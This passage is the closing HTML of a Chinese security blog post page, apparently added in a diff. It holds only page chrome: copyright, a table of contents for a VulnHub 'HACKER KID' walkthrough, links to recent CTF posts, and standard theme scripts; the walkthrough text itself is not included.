+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io">xiubi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/">https://xiubi1125.github.io/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xiubi1125.github.io" target="_blank">休比大王</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/hacker.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/10/16/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025web%E6%96%B9%E5%90%91/" title="Python Pickle 反序列化与2025羊城杯"><img class="cover" src="/img/ycb.jpg" onerror="onerror=null;src='/img/yu.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Python Pickle 反序列化与2025羊城杯</div></div><div class="info-2"><div class="info-item-1">一生奔赴一场大无畏梦境，
+世人轻慢或艳羡着你
+</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="avatar"></div><div class="author-info-name">xiubi</div><div class="author-info-description">或许最低落笔峰都能与光相逢</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">小小的不如意是在为大大的幸福做铺垫ദ്ദി˶ᕑᗢᓫ)✧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1-0-1"><span class="toc-number">1.</span> <span class="toc-text">vulnhub靶场之HACKER KID: 1.0.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ip%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dig%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">dig信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9-Kali-%E7%9A%84-hosts-%E6%96%87%E4%BB%B6%EF%BC%8C%E6%B7%BB%E5%8A%A0%E5%AD%90%E5%9F%9F%E5%90%8D%E6%98%A0%E5%B0%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.修改 Kali 的 hosts 文件，添加子域名映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.</span> <span class="toc-text">DNS 区域传输漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91%EF%BC%88%E6%8F%90%E6%9D%83%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">具体利用逻辑（提权流程）</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/" title="vulnhub靶场之HACKER KID: 1.0.1"><img src="/img/hacker.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="vulnhub靶场之HACKER KID: 1.0.1"></a><div class="content"><a class="title" href="/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/" title="vulnhub靶场之HACKER KID: 1.0.1">vulnhub靶场之HACKER KID: 1.0.1</a><time datetime="2025-10-23T00:59:51.526Z" title="发表于 2025-10-23 08:59:51">2025-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/16/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025web%E6%96%B9%E5%90%91/" title="Python Pickle 反序列化与2025羊城杯"><img src="/img/ycb.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="Python Pickle 反序列化与2025羊城杯"></a><div class="content"><a class="title" href="/2025/10/16/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025web%E6%96%B9%E5%90%91/" title="Python Pickle 反序列化与2025羊城杯">Python Pickle 反序列化与2025羊城杯</a><time datetime="2025-10-16T03:37:34.430Z" title="发表于 2025-10-16 11:37:34">2025-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/11/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%5B%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%5DSSRFMe/" title="redis主从复制与[网鼎杯 2020 ]SSRFMe"><img src="/img/JS1.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="redis主从复制与[网鼎杯 2020 ]SSRFMe"></a><div class="content"><a class="title" href="/2025/10/11/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%5B%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%5DSSRFMe/" title="redis主从复制与[网鼎杯 2020 ]SSRFMe">redis主从复制与[网鼎杯 2020 ]SSRFMe</a><time datetime="2025-10-11T14:08:57.804Z" title="发表于 2025-10-11 22:08:57">2025-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/11/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="JavaScript 原型链污染"><img src="/img/js.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="JavaScript 原型链污染"></a><div class="content"><a class="title" href="/2025/10/11/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="JavaScript 原型链污染">JavaScript 原型链污染</a><time datetime="2025-10-11T13:25:35.642Z" title="发表于 2025-10-11 21:25:35">2025-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/05/Lazysysadmin%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Lazysysadmin靶场"><img src="/img/l.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="Lazysysadmin靶场"></a><div class="content"><a class="title" href="/2025/10/05/Lazysysadmin%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Lazysysadmin靶场">Lazysysadmin靶场</a><time datetime="2025-10-05T12:19:35.738Z" title="发表于 2025-10-05 20:19:35">2025-10-05</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2019 - 2025 By xiubi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas id="snow"></canvas><script src="/js/font.js</script)<script"></script><script src="/js/jquery.js"></script><script async="" src="/js/title.js"></script><meting-js class="no-destroy" id="14171279957" server="netease" type="playlist" fixed="true" autoplay="true" order="random" volume="0.3" list-folded="false" list-max-height="36vh"> </meting-js><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax="">
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 190px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 160px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/一些复现/&quot;);" href="javascript:void(0);">一些复现</a><span class="categoryBar-list-count">7</span><span class="categoryBar-list-descr">被虐的那些年</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/乱七八糟/&quot;);" href="javascript:void(0);">乱七八糟</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">比较碎的一些点</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/靶场系列/&quot;);" href="javascript:void(0);">靶场系列</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr">top10学习日记</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/属于蓝雨的夏天/&quot;);" href="javascript:void(0);">属于蓝雨的夏天</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr">谁给我作业放这了</span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><!-- hexo injector body_end end --></body></html>
